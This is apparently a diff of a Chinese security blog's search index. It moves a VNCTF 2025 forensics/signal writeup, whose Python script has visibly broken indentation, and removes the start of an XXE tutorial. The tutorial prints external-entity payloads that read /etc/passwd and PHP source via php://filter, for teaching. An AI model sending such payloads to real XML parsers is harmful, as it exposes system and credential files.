-<p><strong>总结:HTML head 元素</strong></p>
-<table>
-<thead>
-<tr>
-<th style="text-align:left">标签</th>
-<th style="text-align:left">描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:left"><head></head></td>
-<td style="text-align:left">定义了文档的信息</td>
-</tr>
-<tr>
-<td style="text-align:left"><title></title></td>
-<td style="text-align:left">定义了文档的标题</td>
-</tr>
-<tr>
-<td style="text-align:left"><base></td>
-<td style="text-align:left">定义了页面链接标签的默认链接地址</td>
-</tr>
-<tr>
-<td style="text-align:left"><link></td>
-<td style="text-align:left">定义了一个文档和外部资源之间的关系</td>
-</tr>
-<tr>
-<td style="text-align:left"><meta></td>
-<td style="text-align:left">定义了HTML文档中的元数据</td>
-</tr>
-<tr>
-<td style="text-align:left"><script></td>
-<td style="text-align:left">定义了客户端的脚本文件</td>
-</tr>
-<tr>
-<td style="text-align:left"><style></td>
-<td style="text-align:left">定义了HTML文档的样式文件</td>
-</tr>
-</tbody>
-</table>
-<blockquote>
-<p>[!IMPORTANT]</p>
-</blockquote>
-<p>head 标签用于定义文档头部，它是所有头部元素的容器。<head> 中的元素可以引用脚本、指示浏览器在哪里找到样式表、提供元信息等等。</p>
-<p>如：</p>
-<pre><code class="highlight plaintext">&lt;html&gt;
-  &lt;head&gt;
-     &lt;title&gt;文档标题&lt;/title&gt;
-  &lt;/head&gt;
-&lt;/html&gt;</code></pre>
-<p>header 标签用于定义文档的页眉（介绍信息）。</p>
-<p>如：</p>
-<pre><code class="highlight plaintext">&lt;html&gt;
-  &lt;body&gt;
-    &lt;header&gt;
-        &lt;p&gt;段落&lt;/p&gt;
-        &lt;h1&gt;一级标题&lt;/h1&gt;
-    &lt;/header&gt;
-  &lt;/body&gt;
-&lt;/html&gt;</code></pre>
-<p>注意千万不要弄混。</p>
-</script></td></tr></tbody></table>]]></content>
-      <tags>
-        <tag>-HTML -Web前端</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>RCE</title>
     <url>/2025/01/21/RCE/</url>
     <content><![CDATA[<h1 id="rce远程代码执行漏洞原理及漏洞相关"><a class="markdownIt-Anchor" href="#rce远程代码执行漏洞原理及漏洞相关"></a> RCE（远程代码执行漏洞）原理及漏洞相关</h1>
@@ -4501,130 +4501,6 @@ php &gt;</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>VNCTF2025</title>
-    <url>/2025/02/10/VNCTF2025/</url>
-    <content><![CDATA[<h1 id="vnctf-2025"><a class="markdownIt-Anchor" href="#vnctf-2025"></a> VNCTF 2025</h1>
-<p>入坑CTF以来打过最难的个人赛，打完的表情就像先辈的一张表情包一样</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/e7584e8da9773912fec999bbbd198618347ae2dc.jpg" alt="img"></p>
-<p>比赛期间就出了一题，这才是正统misc吗哈哈(</p>
-<h2 id="vn_lang"><a class="markdownIt-Anchor" href="#vn_lang"></a> <strong>VN_Lang</strong></h2>
-<p>不能较真的签到题，附件一个exe,一个莫名其妙的源代码。看起来花里胡哨，实际010一查就出来了</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180505746.png" alt="image-20250210180505746"></p>
-<h2 id="echo_flowers"><a class="markdownIt-Anchor" href="#echo_flowers"></a> echo_flowers</h2>
-<p>区块链的基本知识和取证搭配的好题。大概?</p>
-<p>给了一个安卓的镜像，先VM开了，不得不吐槽的一点是，操作是真吃力啊。。。</p>
-<p>先放个hint<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180853422.png" alt="image-20250210180853422"></p>
-<p>我没有那么多知识储备，所以其实能用的hint也不多，就一个软件本身没有缓存<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180951701.png" alt="image-20250210180951701"></p>
-<p>看到干干净净的桌面其实就能感觉到不对劲了哈哈，连文件管理都没有还整什么，果断放弃仿真取证。挂DiskGenius</p>
-<p>既然说软件本身没有任何缓存。。那么从哪里入手呢，其实和bashhistory有点相似吧(刚好之前看到过类似的题目)</p>
-<p>也就是，从输入法的缓存，或者说，输入的记录入手。</p>
-<p>定位交给AI<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210181822981.png" alt="image-20250210181822981"></p>
-<p>正好我们是可以找到files这一文件夹的<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210181930421.png" alt="image-20250210181930421"></p>
-<p>接下来一个个看过去其实也可以，最终是可以定位到sgim_gd_usr.bin这个文件的,当然按理来说我们应该先排查.db，.dat，.log这类文件的<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210182036252.png" alt="image-20250210182036252"></p>
-<p>最终找到助记词ranch only space define laundry carpet muscle ramp high twenty couch fashion</p>
-<p>挂上Metamask,记得一定要用没用使用过metamask的浏览器，因为如果你有账户你要导入一般是会让你直接输入密钥登录的</p>
-<p>接下来按照指示输入助记词，重置密码，点击你的账户-&gt;账户详情-&gt;查看密钥就结束了</p>
-<h2 id="ezsignal"><a class="markdownIt-Anchor" href="#ezsignal"></a> ezSignal</h2>
-<p>C3师傅的旷世之作(不仅指半夜更新附件)</p>
-<p>当然其实C3师傅给的hint已经相当多了，或者说，都已经把解题步骤告诉你了哈哈(</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183042001.png" alt="image-20250210183042001"></p>
-<p>直接解压会碰到这个问题，那么有人就要问了为什么呢</p>
-<p>查下或者根据提示可以发现包里是有一个名字为空格的文件的，而在Windows系统中这种文件是不会被显示的.当然在不知道这点的前提下，可以观察一下压缩包的结构</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183450579.png" alt="image-20250210183450579"></p>
-<p>可以明显看到frFileNameLength是1，并且文件名显示的是’ ’</p>
-<p>那么将压缩包复制到Ubuntu</p>
-<pre><code class="highlight bash">unzip ezSignal_fix.zip
-<span class="built_in">mv</span> <span class="string">&#x27; &#x27;</span> 2</code></pre>
-<p>再复制回来，010查一下2,<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183802628.png" alt="image-20250210183802628"></p>
-<p>问一下AI，知道是一个grc文件，搭配<a href="https://wiki.gnuradio.org/index.php/InstallingGR">GNU</a>使用，改后缀为grc</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210184040460.png" alt="image-20250210184040460"></p>
-<p>喂AI/看hint,这是一个窄带调谐+将复数信号转换为虚部实部分别输出的过程，而我们的任务是逆向一下它，写个Python脚本。(赛后C3说可以Cyber chef，可以Linux。。诶我怎么和我的电脑一个温度了)</p>
-<p>喂了半天ChatGPT报错报了一下午＋一晚上，活全家了哈哈()</p>
-<p>抱着试一试的心情给Deepseek跑了一下，两遍过，最支持国产的一集。。。</p>
-<pre><code class="highlight plaintext">import numpy as np
-from scipy.io import wavfile
-from scipy.signal import butter, lfilter
-
-def read_gr_file(filename, dtype=np.float32, endian=&quot;&lt;&quot;):
-    &quot;&quot;&quot;
-    读取 GRC 生成的二进制文件（如 blocks_file_sink 的输出）
-    - dtype: 数据类型（默认 float32）
-    - endian: 字节序（默认小端序 &quot;&lt;&quot;，大端序用 &quot;&gt;&quot;）
-    &quot;&quot;&quot;
-    # 以二进制模式读取文件
-    with open(filename, &quot;rb&quot;) as f:
-        raw_bytes = f.read()
-    
-
-# 转换为指定字节序和类型的 numpy 数组
-
-dt = np.dtype(f&quot;&#123;endian&#125;&#123;dtype().dtype.char&#125;&quot;)
-data = np.frombuffer(raw_bytes, dtype=dt)
-return data
-
-def main():
-
-    # 参数配置（与 GRC 一致）
-
-     samp_rate = 48000      # 音频采样率
-     if_rate = 192000       # 中频速率（usrp_rate/3 = 576000/3）
-     max_dev = 5e3          # FM最大频偏
-     endian = &quot;&lt;&quot;           # 字节序（GRC 默认小端序）
-
-try:
-
-    # 1. 读取I/Q数据（二进制模式）
-
-     i_data = read_gr_file(&quot;flag1.txt&quot;, dtype=np.float32, endian=endian)
-     q_data = read_gr_file(&quot;flag2.txt&quot;, dtype=np.float32, endian=endian)
-
-    # 检查长度一致性
-
-     if len(i_data) != len(q_data):
-         raise ValueError(&quot;I/Q数据长度不一致！&quot;)
-
-    # 2. 合并为复数信号（I + jQ）
-
-     complex_signal = i_data + 1j * q_data
-
-    # 3. FM解调（相位差分法）
-
-     phase = np.unwrap(np.angle(complex_signal))
-     demodulated = np.diff(phase) / (2 * np.pi * max_dev) * if_rate
-     demodulated = demodulated.astype(np.float32)
-
-    # 4. 重采样到音频采样率（48 kHz）
-
-     demodulated_resampled = demodulated[::4]  # 简单下采样
-
-    # 5. 低通滤波（300-5000 Hz，与GRC一致）
-
-     b, a = butter(4, 5000, fs=samp_rate, btype=&#x27;low&#x27;)
-     demodulated_resampled = lfilter(b, a, demodulated_resampled)
-
-    # 6. 归一化并保存为WAV
-
-     demodulated_resampled /= np.max(np.abs(demodulated_resampled)) * 1.2
-     wavfile.write(&quot;flag_recovered.wav&quot;, samp_rate, demodulated_resampled)
-
-     print(&quot;还原成功！保存为 flag_recovered.wav&quot;)
-
-except FileNotFoundError:
-    print(&quot;错误：未找到 flag1.txt 或 flag2.txt！&quot;)
-except Exception as e:
-    print(f&quot;错误：&#123;str(e)&#125;&quot;)
-
-if __name__ == &quot;__main__&quot;:
-    main()</code></pre>
-<p>得到一个92.7MB的wav，那其实一想就是SSTV了，用RX-SSTV跑一下</p>
-<p>得到一张阿兹特克码，扫一下得到flag<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/2025-02-09_09.53.19.jpg" alt="2025-02-09_09.53.19"></p>
-<p>唉，不能老实做传统misc了,不去折腾研究一些东西感觉永远都只能是入门仔了。也算是吃一堑长一智吧。</p>
-]]></content>
-      <tags>
-        <tag>-CTF -Writeup</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>TGCTF_Writeup</title>
     <url>/2025/04/18/TGCTF-Writeup/</url>
     <content><![CDATA[<h1 id="tgctf2025"><a class="markdownIt-Anchor" href="#tgctf2025"></a> TGCTF2025</h1>
@@ -4923,6 +4799,130 @@ black_list=[<span class="string">&#x27;lipsum&#x27;</span>,<span class="string">
 ]]></content>
       <tags>
         <tag>-WriteUp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>VNCTF2025</title>
+    <url>/2025/02/10/VNCTF2025/</url>
+    <content><![CDATA[<h1 id="vnctf-2025"><a class="markdownIt-Anchor" href="#vnctf-2025"></a> VNCTF 2025</h1>
+<p>入坑CTF以来打过最难的个人赛，打完的表情就像先辈的一张表情包一样</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/e7584e8da9773912fec999bbbd198618347ae2dc.jpg" alt="img"></p>
+<p>比赛期间就出了一题，这才是正统misc吗哈哈(</p>
+<h2 id="vn_lang"><a class="markdownIt-Anchor" href="#vn_lang"></a> <strong>VN_Lang</strong></h2>
+<p>不能较真的签到题，附件一个exe,一个莫名其妙的源代码。看起来花里胡哨，实际010一查就出来了</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180505746.png" alt="image-20250210180505746"></p>
+<h2 id="echo_flowers"><a class="markdownIt-Anchor" href="#echo_flowers"></a> echo_flowers</h2>
+<p>区块链的基本知识和取证搭配的好题。大概?</p>
+<p>给了一个安卓的镜像，先VM开了，不得不吐槽的一点是，操作是真吃力啊。。。</p>
+<p>先放个hint<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180853422.png" alt="image-20250210180853422"></p>
+<p>我没有那么多知识储备，所以其实能用的hint也不多，就一个软件本身没有缓存<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180951701.png" alt="image-20250210180951701"></p>
+<p>看到干干净净的桌面其实就能感觉到不对劲了哈哈，连文件管理都没有还整什么，果断放弃仿真取证。挂DiskGenius</p>
+<p>既然说软件本身没有任何缓存。。那么从哪里入手呢，其实和bashhistory有点相似吧(刚好之前看到过类似的题目)</p>
+<p>也就是，从输入法的缓存，或者说，输入的记录入手。</p>
+<p>定位交给AI<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210181822981.png" alt="image-20250210181822981"></p>
+<p>正好我们是可以找到files这一文件夹的<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210181930421.png" alt="image-20250210181930421"></p>
+<p>接下来一个个看过去其实也可以，最终是可以定位到sgim_gd_usr.bin这个文件的,当然按理来说我们应该先排查.db，.dat，.log这类文件的<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210182036252.png" alt="image-20250210182036252"></p>
+<p>最终找到助记词ranch only space define laundry carpet muscle ramp high twenty couch fashion</p>
+<p>挂上Metamask,记得一定要用没用使用过metamask的浏览器，因为如果你有账户你要导入一般是会让你直接输入密钥登录的</p>
+<p>接下来按照指示输入助记词，重置密码，点击你的账户-&gt;账户详情-&gt;查看密钥就结束了</p>
+<h2 id="ezsignal"><a class="markdownIt-Anchor" href="#ezsignal"></a> ezSignal</h2>
+<p>C3师傅的旷世之作(不仅指半夜更新附件)</p>
+<p>当然其实C3师傅给的hint已经相当多了，或者说，都已经把解题步骤告诉你了哈哈(</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183042001.png" alt="image-20250210183042001"></p>
+<p>直接解压会碰到这个问题，那么有人就要问了为什么呢</p>
+<p>查下或者根据提示可以发现包里是有一个名字为空格的文件的，而在Windows系统中这种文件是不会被显示的.当然在不知道这点的前提下，可以观察一下压缩包的结构</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183450579.png" alt="image-20250210183450579"></p>
+<p>可以明显看到frFileNameLength是1，并且文件名显示的是’ ’</p>
+<p>那么将压缩包复制到Ubuntu</p>
+<pre><code class="highlight bash">unzip ezSignal_fix.zip
+<span class="built_in">mv</span> <span class="string">&#x27; &#x27;</span> 2</code></pre>
+<p>再复制回来，010查一下2,<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183802628.png" alt="image-20250210183802628"></p>
+<p>问一下AI，知道是一个grc文件，搭配<a href="https://wiki.gnuradio.org/index.php/InstallingGR">GNU</a>使用，改后缀为grc</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210184040460.png" alt="image-20250210184040460"></p>
+<p>喂AI/看hint,这是一个窄带调谐+将复数信号转换为虚部实部分别输出的过程，而我们的任务是逆向一下它，写个Python脚本。(赛后C3说可以Cyber chef，可以Linux。。诶我怎么和我的电脑一个温度了)</p>
+<p>喂了半天ChatGPT报错报了一下午＋一晚上，活全家了哈哈()</p>
+<p>抱着试一试的心情给Deepseek跑了一下，两遍过，最支持国产的一集。。。</p>
+<pre><code class="highlight plaintext">import numpy as np
+from scipy.io import wavfile
+from scipy.signal import butter, lfilter
+
+def read_gr_file(filename, dtype=np.float32, endian=&quot;&lt;&quot;):
+    &quot;&quot;&quot;
+    读取 GRC 生成的二进制文件（如 blocks_file_sink 的输出）
+    - dtype: 数据类型（默认 float32）
+    - endian: 字节序（默认小端序 &quot;&lt;&quot;，大端序用 &quot;&gt;&quot;）
+    &quot;&quot;&quot;
+    # 以二进制模式读取文件
+    with open(filename, &quot;rb&quot;) as f:
+        raw_bytes = f.read()
+    
+
+# 转换为指定字节序和类型的 numpy 数组
+
+dt = np.dtype(f&quot;&#123;endian&#125;&#123;dtype().dtype.char&#125;&quot;)
+data = np.frombuffer(raw_bytes, dtype=dt)
+return data
+
+def main():
+
+    # 参数配置（与 GRC 一致）
+
+     samp_rate = 48000      # 音频采样率
+     if_rate = 192000       # 中频速率（usrp_rate/3 = 576000/3）
+     max_dev = 5e3          # FM最大频偏
+     endian = &quot;&lt;&quot;           # 字节序（GRC 默认小端序）
+
+try:
+
+    # 1. 读取I/Q数据（二进制模式）
+
+     i_data = read_gr_file(&quot;flag1.txt&quot;, dtype=np.float32, endian=endian)
+     q_data = read_gr_file(&quot;flag2.txt&quot;, dtype=np.float32, endian=endian)
+
+    # 检查长度一致性
+
+     if len(i_data) != len(q_data):
+         raise ValueError(&quot;I/Q数据长度不一致！&quot;)
+
+    # 2. 合并为复数信号（I + jQ）
+
+     complex_signal = i_data + 1j * q_data
+
+    # 3. FM解调（相位差分法）
+
+     phase = np.unwrap(np.angle(complex_signal))
+     demodulated = np.diff(phase) / (2 * np.pi * max_dev) * if_rate
+     demodulated = demodulated.astype(np.float32)
+
+    # 4. 重采样到音频采样率（48 kHz）
+
+     demodulated_resampled = demodulated[::4]  # 简单下采样
+
+    # 5. 低通滤波（300-5000 Hz，与GRC一致）
+
+     b, a = butter(4, 5000, fs=samp_rate, btype=&#x27;low&#x27;)
+     demodulated_resampled = lfilter(b, a, demodulated_resampled)
+
+    # 6. 归一化并保存为WAV
+
+     demodulated_resampled /= np.max(np.abs(demodulated_resampled)) * 1.2
+     wavfile.write(&quot;flag_recovered.wav&quot;, samp_rate, demodulated_resampled)
+
+     print(&quot;还原成功！保存为 flag_recovered.wav&quot;)
+
+except FileNotFoundError:
+    print(&quot;错误：未找到 flag1.txt 或 flag2.txt！&quot;)
+except Exception as e:
+    print(f&quot;错误：&#123;str(e)&#125;&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    main()</code></pre>
+<p>得到一个92.7MB的wav，那其实一想就是SSTV了，用RX-SSTV跑一下</p>
+<p>得到一张阿兹特克码，扫一下得到flag<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/2025-02-09_09.53.19.jpg" alt="2025-02-09_09.53.19"></p>
+<p>唉，不能老实做传统misc了,不去折腾研究一些东西感觉永远都只能是入门仔了。也算是吃一堑长一智吧。</p>
+]]></content>
+      <tags>
+        <tag>-CTF -Writeup</tag>
       </tags>
   </entry>
   <entry>
@@ -5649,226 +5649,6 @@ str:截取的字符串   <span class="keyword">start</span>:起始位置   lengt
 ]]></content>
       <tags>
         <tag>-web -CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>初见XXE</title>
-    <url>/2025/04/28/%E5%88%9D%E8%A7%81XXE/</url>
-    <content><![CDATA[<h1 id="初见xxe"><a class="markdownIt-Anchor" href="#初见xxe"></a> 初见XXE</h1>
-<p>这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。</p>
-<h2 id="什么是xml呢"><a class="markdownIt-Anchor" href="#什么是xml呢"></a> 什么是XML呢</h2>
-<p>XML，全称<strong>可扩展标记语言</strong>，XML是一种用于存储和传输数据的语言。与HTML一样，XML使用标签和数据的树状结构。但不同的是，XML不使用预定义标记，因此可以为标记指定描述数据的名称。由于json的出现，xml的受欢迎程度大大下降。</p>
-<p>XML文档结构包括XML声明+DTD文档类型定义+文档元素</p>
-<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;!--xml文件的声明--&gt;
-&lt;bookstore&gt;                                                 &lt;!--根元素--&gt;
-&lt;book category=&quot;COOKING&quot;&gt;        &lt;!--bookstore的子元素，category为属性--&gt;
-&lt;title&gt;Everyday Italian&lt;/title&gt;           &lt;!--book的子元素，lang为属性--&gt;
-&lt;author&gt;Giada De Laurentiis&lt;/author&gt;                  &lt;!--book的子元素--&gt;
-&lt;year&gt;2005&lt;/year&gt;                                     &lt;!--book的子元素--&gt;
-&lt;price&gt;30.00&lt;/price&gt;                                  &lt;!--book的子元素--&gt;
-&lt;/book&gt;                                                 &lt;!--book的结束--&gt;
-&lt;/bookstore&gt;                                       &lt;!--bookstore的结束--&gt;</code></pre>
-<p>其中<code>&lt;note&gt;</code>是根元素，每个XML文档必须包含一个根元素。</p>
-<p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code> 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。</p>
-<p>standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。</p>
-<h3 id="dtd"><a class="markdownIt-Anchor" href="#dtd"></a> DTD</h3>
-<p><strong>DTD基本概念</strong><br>
-XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的。<br>
-DTD用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。是XML文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。<br>
-<strong>实体引用</strong><br>
-XML元素以形如 <code>&lt;tag&gt;foo&lt;/tag&gt;</code> 的标签开始和结束，如果元素内部出现如<code>&lt;</code> 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义五个实体引用，即用<code>&lt; &gt; &amp; ' &quot;</code> 替换 <code>&lt; &gt; &amp; ' &quot;</code> 。<br>
-实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。<br>
-<strong>dtd的引入方式</strong><br>
-DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。<br>
-<em>内部 DTD</em><br>
-使用内部的dtd文件，即将约束规则定义在xml文档中</p>
-<pre><code class="highlight plaintext">&lt;!DOCTYPE 根元素名称 [元素声明]&gt;</code></pre>
-<p>示例代码：</p>
-<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt;
-&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;
-&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;
-&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;
-&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;
-&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;
-]&gt;
-&lt;note&gt;
-&lt;to&gt;Y0u&lt;/to&gt;
-&lt;from&gt;@re&lt;/from&gt;
-&lt;head&gt;v3ry&lt;/head&gt;
-&lt;body&gt;g00d!&lt;/body&gt;
-&lt;/note&gt;</code></pre>
-<p><em>外部 DTD</em><br>
-（1）引入外部的dtd文件</p>
-<pre><code class="highlight plaintext">&lt;!DOCTYPE 根元素名称 SYSTEM &quot;dtd路径&quot;&gt;</code></pre>
-<p>（2）使用外部的dtd文件(网络上的dtd文件)</p>
-<pre><code class="highlight plaintext">&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文档的URL&quot;&gt;</code></pre>
-<p>当使用外部DTD时，通过如下语法引入：</p>
-<pre><code class="highlight plaintext">&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt;</code></pre>
-<p>示例代码：</p>
-<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
-&lt;!DOCTYPE root-element SYSTEM &quot;test.dtd&quot;&gt;
-&lt;note&gt;
-&lt;to&gt;Y0u&lt;/to&gt;
-&lt;from&gt;@re&lt;/from&gt;
-&lt;head&gt;v3ry&lt;/head&gt;
-&lt;body&gt;g00d!&lt;/body&gt;
-&lt;/note&gt;</code></pre>
-<p>test.dtd</p>
-<pre><code class="highlight plaintext">&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;
-&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;
-&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;
-&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;</code></pre>
-<p><strong>PCDATA</strong><br>
-PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。<br>
-被解析的字符数据不应当包含任何<code>&amp;</code>，<code>&lt;</code>，或者<code>&gt;</code>字符，需要用<code>&amp;</code> <code>&lt;</code> <code>&gt;</code>实体来分别替换。<br>
-<strong>CDATA</strong><br>
-CDATA意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。<br>
-<strong>DTD元素</strong><br>
-<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20191202150727-65e7882a-14d2-1.png" alt="img"><br>
-<strong>DTD属性</strong><br>
-<strong>属性声明语法</strong>：</p>
-<pre><code class="highlight plaintext">&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</code></pre>
-<p>DTD实例：</p>
-<pre><code class="highlight plaintext">&lt;!ATTLIST payment Luckey CDATA &quot;Q&quot;&gt;</code></pre>
-<p>XML实例：</p>
-<pre><code class="highlight plaintext">&lt;payment Luckey=&quot;Q&quot; /&gt;</code></pre>
-<p>以下是 属性类型的选项</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20191202150821-85ef2e3e-14d2-1.png" alt="20191202150821-85ef2e3e-14d2-1"></p>
-<p>默认属性值可使用下列值：</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20191202150849-96eb9a7e-14d2-1.png" alt="20191202150849-96eb9a7e-14d2-1"></p>
-<p><strong>DTD实体</strong></p>
-<blockquote>
-<p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。<br>
-实体引用是对实体的引用。<br>
-实体可在内部或外部进行声明。</p>
-</blockquote>
-<p><em>按实体有无参分类，实体分为一般实体和参数实体</em><br>
-<em>一般实体的声明</em>：<code>&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;</code><br>
-引用一般实体的方法：<code>&amp;实体名称;</code><br>
-ps：经实验，普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。</p>
-<p><em>参数实体的声明</em>：<code>&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;</code><br>
-引用参数实体的方法：<code>%实体名称;</code><br>
-ps：经实验，参数实体只能在DTD中引用，不能在声明前引用，也不能在实体声明内部引用。<br>
-DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
-<p><em>按实体使用方式分类，实体分为内部声明实体和引用外部实体</em><br>
-<em>内部实体</em></p>
-<pre><code class="highlight plaintext">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></pre>
-<p>内部实体示例代码：</p>
-<pre><code class="highlight plaintext">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;
-&lt;!DOCTYPE test [
-    &lt;!ENTITY writer &quot;Dawn&quot;&gt;
-    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;
-]&gt;
-&lt;test&gt;&amp;writer;©right;&lt;/test&gt;</code></pre>
-<p><em>外部实体</em><br>
-外部实体，用来引入外部资源。有<code>SYSTEM</code>和<code>PUBLIC</code>两个关键字，表示实体来自本地计算机还是公共计算机。</p>
-<pre><code class="highlight plaintext">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;
-或者
-&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></pre>
-<p>外部实体示例代码：</p>
-<pre><code class="highlight plaintext">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;
-&lt;!DOCTYPE test [
-    &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
-    &lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;
-]&gt;
-&lt;author&gt;&amp;file;©right;&lt;/author&gt;</code></pre>
-<p>外部实体可支持http、file等协议。不同程序支持的协议不同：<br>
-<img src="https://xzfile.aliyuncs.com/media/upload/picture/20191202150935-b26e4a30-14d2-1.png" alt="img"><br>
-PHP支持的协议会更多一些，但需要一定的扩展：<br>
-<img src="https://xzfile.aliyuncs.com/media/upload/picture/20191202151023-cf02c3ba-14d2-1.png" alt="img"><br>
-PHP引用外部实体，<strong>常见的利用协议</strong>：</p>
-<pre><code class="highlight plaintext">file://文件绝对路径 如：file:///etc/passwd
-http://url/file.txt
-php://filter/read=convert.base64-encode/resource=xxx.php</code></pre>
-<p><em>参数实体+外部实体</em></p>
-<pre><code class="highlight plaintext">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</code></pre>
-<p>参数实体+外部实体示例代码：</p>
-<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
-&lt;!DOCTYPE test [
-  &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
-  %file;
-]&gt;</code></pre>
-<p><code>%file</code>(参数实体)是在DTD中被引用的，而<code>&amp;file;</code>是在xml文档中被引用的。</p>
-<h2 id="xml外部实体注入xxe"><a class="markdownIt-Anchor" href="#xml外部实体注入xxe"></a> XML外部实体注入(XXE)</h2>
